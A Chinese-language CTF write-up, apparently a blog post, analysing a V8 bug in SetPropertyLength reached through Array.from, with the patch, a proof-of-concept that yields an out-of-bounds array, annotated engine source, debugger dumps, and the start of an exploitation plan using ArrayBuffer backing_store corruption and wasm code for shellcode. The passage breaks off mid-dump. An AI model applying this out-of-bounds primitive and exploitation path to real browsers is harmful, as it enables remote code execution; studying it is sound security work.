class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen<span class="selector-class">.py</span> x64.release</span><br><span class="line">ninja -C out.gn/x64<span class="selector-class">.release</span> d8</span><br></pre></td></tr></table></figure></p><p>这里在编译参数<code>args.gn</code>中加上了:<code>v8_enable_object_print = true</code>，但编译出来的release版本仍然不能用job,v8print等…,可能是版本问题吧，调试起来不方便，于是又编译了debug版本，方便使用job，v8print等查看对象布局:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/v8gen<span class="selector-class">.py</span> x64.debug</span><br><span class="line">ninja -C out.gn/x64<span class="selector-class">.debug</span> d8</span><br></pre></td></tr></table></figure></p><p>不使用debug版本直接写exp的原因是debug版本中有DCHECK.</p><h4 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析:"></a>patch分析:</h4><p>patch了<code>SetPropertyLength</code>这个函数<br><img src="/2019/07/02/roll-a-d8-v8利用学习/1.png" alt=""></p><p>这里的builtin函数是使用CodeStubAssembler写的，关于如何写CodeStubAssembler builtin可以参考官网文档 <a href="https://v8.dev/docs/csa-builtins" target="_blank" rel="noopener">https://v8.dev/docs/csa-builtins</a> </p><p>这里将<code>GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</code>修改为了<code>GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</code><br>通过注释可以知道: 如果 length_smi小于old_length，则跳转到runtime，进行array的收缩。否者不跳转，执行<code>StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,length_smi);</code> 将array的length设置为length_smi,这里的length_smi是迭代的次数，old_length是array原来的长度.</p><p>而patch将逻辑修改为 length_smi 不等于 old_length 则跳转到runtime.说明之前的逻辑在 length_smi大于 old_length 时存在问题，如果大于，则不会跳转到<code>runtime</code>,会去执行<br><code>StoreObjectFieldNoWriteBarrier</code>,将array的长度设置为更大的length_smi.</p><h4 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析:"></a>poc分析:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+<span class="comment">// Tests that creating an iterator that shrinks the array populated by</span></span><br><span class="line">+<span class="comment">// Array.from does not lead to out of bounds writes.</span></span><br><span class="line">+<span class="keyword">let</span> oobArray = [];</span><br><span class="line">+<span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line">+<span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">+  &#123;</span><br><span class="line">+    counter : <span class="number">0</span>,</span><br><span class="line">+    next() &#123;</span><br><span class="line">+      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">+      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">+        oobArray.length = <span class="number">0</span>;</span><br><span class="line">+        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">+      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">+      &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+  &#125;</span><br><span class="line">+) &#125;);</span><br><span class="line">+assertEquals(oobArray.length, maxSize);</span><br><span class="line">+</span><br><span class="line">+<span class="comment">// iterator reset the length to 0 just before returning done, so this will crash</span></span><br><span class="line">+<span class="comment">// if the backing store was not resized correctly.</span></span><br><span class="line">+oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure><p>Array.from函数的用途可以查看: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from" target="_blank" rel="noopener">Array.from()</a></p><blockquote><p>Array.from() 方法从一个类似数组或可迭代对象中创建一个新的，浅拷贝的数组实例。</p></blockquote><p>在debug版本运行该poc，v8就会挂掉:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wxy<span class="variable">@ubuntu</span><span class="symbol">:/mnt/hgfs/vmshare/js_exp/v8/out</span>.gn/x64.debug<span class="variable">$ </span>./d8 poc.js </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Fatal error in ../../src/objects/fixed-array-inl.h, line 96</span></span><br><span class="line"><span class="comment"># Debug check failed: index &lt; this-&gt;length() (8223 vs. 0).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#FailureMessage Object: 0x7ffe999d87a0</span></span><br></pre></td></tr></table></figure></p><p>从DCHECK可以看到是越界访问了.</p><p>poc在迭代的最后一次将oobArray的length设置为0.</p><p>分析polyfill.js中from的js实现:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">define(</span><br><span class="line">  <span class="built_in">Array</span>, <span class="string">'from'</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">from</span>(<span class="params">items</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mapfn = <span class="built_in">arguments</span>[<span class="number">1</span>];<span class="comment">//获得map函数</span></span><br><span class="line">    <span class="keyword">var</span> thisArg = <span class="built_in">arguments</span>[<span class="number">2</span>];<span class="comment">//获得map函数的this</span></span><br><span class="line">    <span class="keyword">var</span> c = strict(<span class="keyword">this</span>);  <span class="comment">//获得this</span></span><br><span class="line">    <span class="keyword">if</span> (mapfn === <span class="literal">undefined</span>) &#123; <span class="comment">//判断是否提供了map函数</span></span><br><span class="line">      <span class="keyword">var</span> mapping = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!IsCallable(mapfn)) <span class="keyword">throw</span> <span class="built_in">TypeError</span>();</span><br><span class="line">      <span class="keyword">var</span> t = thisArg;</span><br><span class="line">      mapping = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> usingIterator = GetMethod(items, $$iterator);</span><br><span class="line">    <span class="keyword">if</span> (usingIterator !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (IsConstructor(c)) &#123; <span class="comment">//判断c是否是函数</span></span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> c(); <span class="comment">//如果是函数则 new c();</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>在poc中，使用call将this替换成了 function ，所以这里会调用 new c(), 而new一个函数对象时，如果函数return的是一个对象，则new得到的即是这个函数返回的对象,否者是函数对象本身.<br>关于的new的返回值可以参考<a href="https://blog.csdn.net/charking_gg/article/details/78027828" target="_blank" rel="noopener">JS中new操作符与函数返回值return</a>，则之后 a 即是oobArray.</p><p>知道from的实现逻辑后就可以看v8中from的实现了:<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line">...</span><br><span class="line">  BIND(<span class="variable">&amp;normal_iterate</span>);</span><br><span class="line">  TNode<span class="params">&lt;Object&gt;</span> map_function = args.GetOptionalArgumentValue(<span class="number">1</span>);<span class="comment">//获得map_function</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If map_function is not undefined, then ensure it's callable else throw.</span></span><br><span class="line">  &#123;</span><br><span class="line">    Label no_error(this), error(this);</span><br><span class="line">    GotoIf(IsUndefined(map_function), <span class="variable">&amp;no_error</span>);<span class="comment">//没定义就跳到no_error</span></span><br><span class="line">    GotoIf(TaggedIsSmi(map_function), <span class="variable">&amp;error</span>);<span class="comment">//是smi,就跳到error</span></span><br><span class="line">    Branch(IsCallable(CAST(map_function)), <span class="variable">&amp;no_error</span>, <span class="variable">&amp;error</span>);<span class="comment">//map_function可以调用就跳到no_error</span></span><br><span class="line"></span><br><span class="line">    BIND(<span class="variable">&amp;error</span>);</span><br><span class="line">    ThrowTypeError(context, <span class="symbol">MessageTemplate::</span>kCalledNonCallable, map_function);</span><br><span class="line"></span><br><span class="line">    BIND(<span class="variable">&amp;no_error</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Label iterable(this), not_iterable(this), finished(this), if_exception(this);</span><br><span class="line"></span><br><span class="line">  TNode<span class="params">&lt;Object&gt;</span> this_arg = args.GetOptionalArgumentValue(<span class="number">2</span>);<span class="comment">//获得 map_function的this</span></span><br><span class="line">  <span class="comment">// The spec doesn't require ToObject to be called directly on the iterable</span></span><br><span class="line">  <span class="comment">// branch, but it's part of GetMethod that is in the spec.</span></span><br><span class="line">  TNode<span class="params">&lt;JSReceiver&gt;</span> array_like = ToObject_Inline(context, items);<span class="comment">//获得array_like</span></span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, array); <span class="comment">//创建两个变量: array,length</span></span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  <span class="comment">////如果为null或者undefined,则跳转到not_iterable, 否者跳转到iterable</span></span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), <span class="variable">&amp;not_iterable</span>, <span class="variable">&amp;iterable</span>);</span><br><span class="line"></span><br><span class="line">  BIND(<span class="variable">&amp;iterable</span>);</span><br><span class="line">  &#123;</span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line">    TVARIABLE(Object, var_exception);</span><br><span class="line">    Label loop(this, <span class="variable">&amp;index</span>), loop_done(this),</span><br><span class="line">        on_exception(this, <span class="symbol">Label::</span>kDeferred),</span><br><span class="line">        index_overflow(this, <span class="symbol">Label::</span>kDeferred);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the method is callable. 检查方法是否可调用</span></span><br><span class="line">    &#123;</span><br><span class="line">      Label get_method_not_callable(this, <span class="symbol">Label::</span>kDeferred), next(this);</span><br><span class="line">      GotoIf(TaggedIsSmi(iterator_method), <span class="variable">&amp;get_method_not_callable</span>);<span class="comment">//如果是smi或者不可调用,则跳转到get_method_not_callable</span></span><br><span class="line">      GotoIfNot(IsCallable(CAST(iterator_method)), <span class="variable">&amp;get_method_not_callable</span>);</span><br><span class="line">      Goto(<span class="variable">&amp;next</span>);<span class="comment">//调转到next.</span></span><br><span class="line"></span><br><span class="line">      BIND(<span class="variable">&amp;get_method_not_callable</span>);</span><br><span class="line">      ThrowTypeError(context, <span class="symbol">MessageTemplate::</span>kCalledNonCallable,</span><br><span class="line">                     iterator_method);</span><br><span class="line"></span><br><span class="line">      BIND(<span class="variable">&amp;next</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="comment">//创建一个空的array，用来存放迭代的数据. , 在poc里使用了call，这里的array就是oobarray.</span></span><br><span class="line">    array = ConstructArrayLike(context, receiver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actually get the iterator and throw if the iterator method does not yield</span></span><br><span class="line">    <span class="comment">// one.</span></span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">    TNode<span class="params">&lt;Context&gt;</span> native_context = LoadNativeContext(context);</span><br><span class="line">    TNode<span class="params">&lt;Object&gt;</span> fast_iterator_result_map =</span><br><span class="line">        LoadContextElement(native_context, <span class="symbol">Context::</span>ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">    Goto(<span class="variable">&amp;loop</span>);</span><br><span class="line"></span><br><span class="line">    BIND(<span class="variable">&amp;loop</span>);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Loop while iterator is not done.//进入循环,如果done则跳转到loop_done</span></span><br><span class="line">      TNode<span class="params">&lt;Object&gt;</span> next = iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, <span class="variable">&amp;loop_done</span>, fast_iterator_result_map);</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value returned from the iterator. Exceptions are</span></span><br><span class="line">      <span class="comment">// caught so the iterator can be closed.</span></span><br><span class="line">      &#123;</span><br><span class="line">        Label next(this);</span><br><span class="line">        GotoIf(IsUndefined(map_function), <span class="variable">&amp;next</span>);<span class="comment">//如果map_function是undefined，则跳转到next.</span></span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(this, IsCallable(CAST(map_function)));</span><br><span class="line">        Node* v = CallJS(<span class="symbol">CodeFactory::</span>Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());<span class="comment">//调用map_function</span></span><br><span class="line">        GotoIfException(v, <span class="variable">&amp;on_exception</span>, <span class="variable">&amp;var_exception</span>);</span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(<span class="variable">&amp;next</span>);</span><br><span class="line">        BIND(<span class="variable">&amp;next</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(<span class="symbol">Runtime::</span>kCreateDataProperty, context, array.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, <span class="variable">&amp;on_exception</span>, <span class="variable">&amp;var_exception</span>);</span><br><span class="line"></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The spec requires that we throw an exception if index reaches 2^53-1,</span></span><br><span class="line">      <span class="comment">// but an empty loop would take &gt;100 days to do this many iterations. To</span></span><br><span class="line">      <span class="comment">// actually run for that long would require an iterator that never set</span></span><br><span class="line">      <span class="comment">// done to true and a target array which somehow never ran out of memory,</span></span><br><span class="line">      <span class="comment">// e.g. a proxy that discarded the values. Ignoring this case just means</span></span><br><span class="line">      <span class="comment">// we would repeatedly call CreateDataProperty with index = 2^53.</span></span><br><span class="line">      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(<span class="symbol">Operation::</span>kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                          not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(<span class="variable">&amp;loop</span>);</span><br><span class="line">    &#125;<span class="comment">//loop</span></span><br><span class="line"></span><br><span class="line">    BIND(<span class="variable">&amp;loop_done</span>); <span class="comment">// 循环结束</span></span><br><span class="line">    &#123;</span><br><span class="line">      length = index; <span class="comment">//length 等于迭代的次数</span></span><br><span class="line">      Goto(<span class="variable">&amp;finished</span>);<span class="comment">//跳转到finish</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(<span class="variable">&amp;on_exception</span>);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Close the iterator, rethrowing either the passed exception or</span></span><br><span class="line">      <span class="comment">// exceptions thrown during the close.</span></span><br><span class="line">      iterator_assembler.IteratorCloseOnException(context, iterator_record,</span><br><span class="line">                                                  var_exception.value());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">  BIND(<span class="variable">&amp;finished</span>);<span class="comment">//最后跳到这里，调用SetPropertyLength</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  SetPropertyLength(context, array.value(), length.value());</span><br><span class="line">  args.PopAndReturn(array.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在from的实现中,创建了一个新array用来存放迭代的数据:<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">array</span> = ConstructArrayLike(context, receiver);</span><br></pre></td></tr></table></figure></p><p>迭代完之后跳转到finish，执行这个有漏洞的函数进行内存的调整:<br><code>SetPropertyLength(context, array.value(), length.value());</code></p><p>而这个函数会在迭代次数(length_smi)小于新创建的array的长度(old_length)时,跳转到runtime，进行内存的回收.在没有打patch之前，当length_smi大于等于old_length的时候，不会跳转到runtime，而是直接将新创建array的length设置为length_smi.</p><p>poc里，使用了call，将Array.from函数里的this更改为oobArray，即新创建的array变成了poc里的oobArray.在迭代的最后一次将oobArray的length修改为0:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;done: <span class="literal">true</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时oobArray的内存进行了缩减。迭代完成后，进入到<code>SetPropertyLength(context, array.value(), length.value())</code>里，此时old_length(oobArray.length) = 0 ，length_smi(迭代的次数) = maxsize , 即length_smi大于old_length，则不会跳转到runtime，而是会调用<code>StoreObjectFieldNoWriteBarrier</code>:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  If the created<span class="built_in"> array </span>already has a length greater than required,</span><br><span class="line">//  then use the runtime to set the property as that will insert holes</span><br><span class="line">//  into the excess elements<span class="built_in"> and/or </span>shrink the backing store.</span><br><span class="line"></span><br><span class="line">    GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">    StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                      length_smi);</span><br></pre></td></tr></table></figure></p><p>而<code>StoreObjectFieldNoWriteBarrier</code>将oobArray的length直接修改为length_smi(不会进行内存的增减)，但是oobArray的内存空间只有old_length = 0这么大，这样就可以访问到不属于oobAarray的空间，造成oob:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(oobArray);</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        %SystemBreak();</span><br><span class="line">        print(<span class="string">"Before oobArray.length ==&gt; "</span>+oobArray.length)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">print(<span class="string">"After oobArray.length ==&gt; "</span>+oobArray.length);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure></p><p>可知迭代完后oobArray对象情况如下:<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x269e9240d</span>929</span><br><span class="line"><span class="number">0x269e9240d</span>929: [JSArray]</span><br><span class="line"> - <span class="keyword">map</span>: <span class="number">0xfd1a6f</span>82679 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3ab4d</span>285539 &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x2172d</span>ca02251 &lt;FixedArray[<span class="number">0</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">8224</span></span><br><span class="line"> - properties: <span class="number">0x2172d</span>ca02251 &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: <span class="number">0x2172dca4ff</span>89 &lt;AccessorInfo&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>length为8224,而分配的空间是:FixedArray[0].这样就可以访问不属于oobArray的空间.</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>利用ArrayBuffer对象中的backing_store，该区域指向了真正的缓冲区.当使用Dataview或者TypeArray读写数据时，其实是向backing_store指向的区域读写.那么修改ArrayBuffer中的backing_store为你想要读写的地址即可得到任意读写:<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: <span class="number">0x22971a30df</span>61: [JSArrayBuffer]</span><br><span class="line"> - <span class="keyword">map</span>: <span class="number">0x2d702b083f</span>e9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x2672fd</span>e92981 &lt;Object <span class="keyword">map</span> = <span class="number">0x2d</span>702b084041&gt;</span><br><span class="line"> - elements: <span class="number">0xbbe9ee02251</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: <span class="number">2</span></span><br><span class="line"> - backing_store: <span class="number">0x55cf</span>8ac477c0</span><br><span class="line"> - byte_length: <span class="number">4660</span></span><br><span class="line"> - neuterable</span><br><span class="line"> - properties: <span class="number">0xbbe9ee02251</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (<span class="literal">nil</span>)</span><br><span class="line">    (<span class="literal">nil</span>)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>得到任意读写后，如何执行shellcode:<br>通过wasm_function对象找到编译过后的函数的入口点，不同版本查找方法可能会有所不同，本题的路径如下:<br>通过wasm_function对象找到shared_info:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">DebugPrint:</span> <span class="number">0x10d0c0027df1</span><span class="string">:</span> <span class="string">[Function]</span> <span class="string">in</span> <span class="string">OldSpace</span></span><br><span class="line"><span class="attr"> - map:</span> <span class="number">0x3ff55ac0cde1</span> <span class="string">&lt;Map(HOLEY_ELEMENTS)&gt;</span> <span class="string">[FastProperties]</span></span><br><span class="line"><span class="attr"> - prototype:</span> <span class="number">0x10d0c0004611</span> <span class="string">&lt;JSFunction</span> <span class="string">(sfi</span> <span class="string">=</span> <span class="number">0x3b6d4ec05559</span><span 